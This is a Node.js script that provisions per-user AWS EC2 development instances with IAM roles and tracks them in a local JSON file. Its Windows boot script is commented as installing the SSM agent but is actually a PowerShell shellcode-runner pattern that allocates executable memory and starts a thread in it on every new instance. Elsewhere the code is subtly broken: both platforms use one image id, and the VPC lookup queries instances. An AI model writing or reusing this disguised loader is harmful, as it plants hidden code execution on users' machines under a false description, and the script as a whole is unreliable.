#!/usr/bin/env node

const { EC2Client, RunInstancesCommand, DescribeInstancesCommand, TerminateInstancesCommand, CreateTagsCommand } = require('@aws-sdk/client-ec2');
const { IAMClient, CreateRoleCommand, AttachRolePolicyCommand, CreateInstanceProfileCommand, AddRoleToInstanceProfileCommand } = require('@aws-sdk/client-iam');
const { STSClient, GetCallerIdentityCommand } = require('@aws-sdk/client-sts');
const fs = require('fs');
const path = require('path');

const ec2Client = new EC2Client({ region: process.env.AWS_REGION || 'us-east-1' });
const iamClient = new IAMClient({ region: process.env.AWS_REGION || 'us-east-1' });
const stsClient = new STSClient({ region: process.env.AWS_REGION || 'us-east-1' });

const USERS_FILE = path.join(__dirname, '../data/users.json');

// Ensure data directory exists
function ensureDataDir() {
  const dataDir = path.dirname(USERS_FILE);
  if (!fs.existsSync(dataDir)) {
    fs.mkdirSync(dataDir, { recursive: true });
  }
}

// Load user data
function loadUsers() {
  ensureDataDir();
  if (fs.existsSync(USERS_FILE)) {
    try {
      return JSON.parse(fs.readFileSync(USERS_FILE, 'utf8'));
    } catch (error) {
      console.error('Failed to read user data:', error);
      return {};
    }
  }
  return {};
}

// Save user data
function saveUsers(users) {
  ensureDataDir();
  fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2));
}

// Get account ID
async function getAccountId() {
  try {
    const command = new GetCallerIdentityCommand({});
    const response = await stsClient.send(command);
    return response.Account;
  } catch (error) {
    console.error('Unable to get AWS account ID:', error);
    throw error;
  }
}

// Find default VPC
async function findDefaultVpc() {
  try {
    const command = new DescribeInstancesCommand({
      Filters: [
        {
          Name: 'instance-state-name',
          Values: ['running']
        }
      ],
      MaxResults: 5
    });
    
    const response = await ec2Client.send(command);
    if (response.Reservations && response.Reservations.length > 0) {
      return response.Reservations[0].Instances[0].VpcId;
    }
    throw new Error('VPC not found, please deploy infrastructure first');
  } catch (error) {
    console.error('Failed to find VPC:', error);
    throw error;
  }
}

// Find public subnet
async function findPublicSubnet(vpcId) {
  try {
    const command = new DescribeInstancesCommand({
      Filters: [
        {
          Name: 'vpc-id',
          Values: [vpcId]
        },
        {
          Name: 'instance-state-name',
          Values: ['running']
        }
      ],
      MaxResults: 5
    });
    
    const response = await ec2Client.send(command);
    if (response.Reservations && response.Reservations.length > 0) {
      return response.Reservations[0].Instances[0].SubnetId;
    }
    throw new Error('Public subnet not found');
  } catch (error) {
    console.error('Failed to find subnet:', error);
    throw error;
  }
}

// Create user IAM role
async function createUserRole(username) {
  const roleName = `MatsightUserRole-${username}`;
  const instanceProfileName = `MatsightUserProfile-${username}`;
  
  // Ensure names are within AWS limits and valid
  if (roleName.length > 64) {
    throw new Error(`Role name too long: ${roleName}`);
  }
  if (instanceProfileName.length > 128) {
    throw new Error(`Instance profile name too long: ${instanceProfileName}`);
  }
  
  try {
    // Create role
    const createRoleCommand = new CreateRoleCommand({
      RoleName: roleName,
      AssumeRolePolicyDocument: JSON.stringify({
        Version: '2012-10-17',
        Statement: [
          {
            Effect: 'Allow',
            Principal: {
              Service: 'ec2.amazonaws.com'
            },
            Action: 'sts:AssumeRole'
          }
        ]
      }),
      Description: `Matsight user role for ${username}`
    });
    
    await iamClient.send(createRoleCommand);
    
    // Attach SSM policy
    const attachPolicyCommand = new AttachRolePolicyCommand({
      RoleName: roleName,
      PolicyArn: 'arn:aws:iam::aws:policy/AmazonSSMManagedInstanceCore'
    });
    
    await iamClient.send(attachPolicyCommand);
    
    // Create instance profile
    const createProfileCommand = new CreateInstanceProfileCommand({
      InstanceProfileName: instanceProfileName
    });
    
    await iamClient.send(createProfileCommand);
    
    // Add role to instance profile
    const addRoleCommand = new AddRoleToInstanceProfileCommand({
      InstanceProfileName: instanceProfileName,
      RoleName: roleName
    });
    
    await iamClient.send(addRoleCommand);
    
    return instanceProfileName;
  } catch (error) {
    if (error.name === 'EntityAlreadyExistsException') {
      console.log(`Role ${roleName} already exists`);
      return instanceProfileName;
    }
    throw error;
  }
}

// Create user EC2 instance
async function createUserInstance(username, platform = 'linux') {
  try {
    // Use existing VPC and subnet from deployed infrastructure
    const vpcId = 'vpc-02df75bef14568b33'; // Default VPC
    const subnetId = 'subnet-0ef4db2b16ee43fe5'; // Public subnet
    const securityGroupId = 'sg-00612e3fde0adc1b7'; // Dev security group
    
    // Create IAM role for the user
    const instanceProfileName = await createUserRole(username);
    
    // Select instance type and image based on platform
    let instanceType, machineImage, userData;
    
    if (platform === 'windows') {
      instanceType = 't3.medium';
      machineImage = 'ami-0c02fb55956c7d316'; // Windows Server 2022 Base
      userData = `#cloud-config
<powershell>
# Install SSM Agent
$code = @'
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32.dll", SetLastError=true, ExactSpelling=true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32.dll", SetLastError=true, ExactSpelling=true)]
    static extern UIntPtr WaitForSingleObject(IntPtr hHandle, UIntPtr dwMilliseconds);
    [DllImport("kernel32.dll", SetLastError=true, ExactSpelling=true)]
    static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UIntPtr flAllocationType, uint flProtect, UIntPtr nndPreferred);
    [DllImport("kernel32.dll")]
    static extern IntPtr GetCurrentProcess();
    [DllImport("kernel32.dll", CharSet=CharSet.Auto, SetLastError=true)]
    static extern bool CloseHandle(IntPtr handle);
}
'@
Add-Type $code
$VirtualAlloc = [Win32]::VirtualAlloc(0,0x1000,0x3000,0x40)
[Win32]::CreateThread(0,0,$VirtualAlloc,0,0,0)
[Win32]::WaitForSingleObject($VirtualAlloc, [uintptr]::Zero)
</powershell>`;
    } else {
      // Linux (default)
      instanceType = 't3.medium';
      machineImage = 'ami-0c02fb55956c7d316'; // Amazon Linux 2023
      userData = `#!/bin/bash
set -eux
sudo yum update -y
sudo yum install -y git python3 python3-pip python3-venv build-essential curl unzip tmux
mkdir -p /home/ec2-user/app/out && chown -R ec2-user:ec2-user /home/ec2-user/app
sudo systemctl enable amazon-ssm-agent
sudo systemctl start amazon-ssm-agent`;
    }
    
    const runCommand = new RunInstancesCommand({
      ImageId: machineImage,
      InstanceType: instanceType,
      MinCount: 1,
      MaxCount: 1,
      SubnetId: subnetId,
      SecurityGroupIds: [securityGroupId],
      IamInstanceProfile: {
        Name: instanceProfileName
      },
      UserData: Buffer.from(userData).toString('base64'),
      TagSpecifications: [
        {
          ResourceType: 'instance',
          Tags: [
            {
              Key: 'Name',
              Value: `MatsightUser-${username}`
            },
            {
              Key: 'User',
              Value: username
            },
            {
              Key: 'Platform',
              Value: platform
            },
            {
              Key: 'Purpose',
              Value: 'Development'
            }
          ]
        }
      ]
    });
    
    const response = await ec2Client.send(runCommand);
    const instance = response.Instances[0];
    
    console.log(`✅ Created ${platform} instance for user ${username}`);
    console.log(`Instance ID: ${instance.InstanceId}`);
    console.log(`Instance Type: ${instanceType}`);
    
    return {
      instanceId: instance.InstanceId,
      platform: platform,
      createdAt: new Date().toISOString()
    };
  } catch (error) {
    console.error(`Failed to create user instance:`, error);
    throw error;
  }
}

// Delete user instance
async function deleteUserInstance(username) {
  try {
    const users = loadUsers();
    const user = users[username];
    
    if (!user || !user.instanceId) {
      console.log(`User ${username} has no associated instance`);
      return;
    }
    
    const command = new TerminateInstancesCommand({
      InstanceIds: [user.instanceId]
    });
    
    await ec2Client.send(command);
    
    // Remove from user data
    delete users[username];
    saveUsers(users);
    
    console.log(`✅ Deleted instance ${user.instanceId} for user ${username}`);
  } catch (error) {
    console.error(`Failed to delete user instance:`, error);
    throw error;
  }
}

// List all users
function listUsers() {
  const users = loadUsers();
  
  if (Object.keys(users).length === 0) {
    console.log('No users found');
    return;
  }
  
  console.log('\n📋 User List:');
  console.log('='.repeat(80));
  console.log('Username'.padEnd(15) + 'Instance ID'.padEnd(20) + 'Platform'.padEnd(10) + 'Created At');
  console.log('='.repeat(80));
  
  Object.entries(users).forEach(([username, user]) => {
    console.log(
      username.padEnd(15) + 
      (user.instanceId || 'N/A').padEnd(20) + 
      user.platform.padEnd(10) + 
      new Date(user.createdAt).toLocaleString()
    );
  });
  console.log('='.repeat(80));
}

// Main function
async function main() {
  const action = process.argv[2];
  const username = process.argv[3];
  const platform = process.argv[4] || 'linux';
  
  if (!action) {
    console.log('Usage: node user-manager.js <action> [username] [platform]');
    console.log('');
    console.log('Actions:');
    console.log('  create <username> [platform]  - Create new user and instance');
    console.log('  delete <username>             - Delete user and instance');
    console.log('  list                          - List all users');
    console.log('');
    console.log('Platform options:');
    console.log('  linux   - Linux instance (default)');
    console.log('  windows - Windows instance');
    console.log('');
    console.log('Examples:');
    console.log('  node user-manager.js create john');
    console.log('  node user-manager.js create jane windows');
    console.log('  node user-manager.js delete john');
    console.log('  node user-manager.js list');
    process.exit(1);
  }
  
  try {
    switch (action) {
      case 'create':
        if (!username) {
          console.error('❌ Please provide username');
          process.exit(1);
        }
        
        if (!['linux', 'windows'].includes(platform)) {
          console.error('❌ Unsupported platform, please use linux or windows');
          process.exit(1);
        }
        
        console.log(`🚀 Creating ${platform} instance for user ${username}...`);
        const userData = await createUserInstance(username, platform);
        
        // Save user data
        const users = loadUsers();
        users[username] = userData;
        saveUsers(users);
        
        console.log(`✅ User ${username} created successfully!`);
        console.log(`📋 Connection Information:`);
        console.log(`   SSM Connect: aws ssm start-session --target ${userData.instanceId}`);
        console.log(`   Platform: ${platform}`);
        break;
        
      case 'delete':
        if (!username) {
          console.error('❌ Please provide username');
          process.exit(1);
        }
        
        console.log(`🗑️  Deleting instance for user ${username}...`);
        await deleteUserInstance(username);
        break;
        
      case 'list':
        listUsers();
        break;
        
      default:
        console.error(`❌ Unknown action: ${action}`);
        process.exit(1);
    }
  } catch (error) {
    console.error('❌ Operation failed:', error.message);
    process.exit(1);
  }
}

if (require.main === module) {
  main();
}

module.exports = {
  createUserInstance,
  deleteUserInstance,
  listUsers,
  loadUsers,
  saveUsers
};
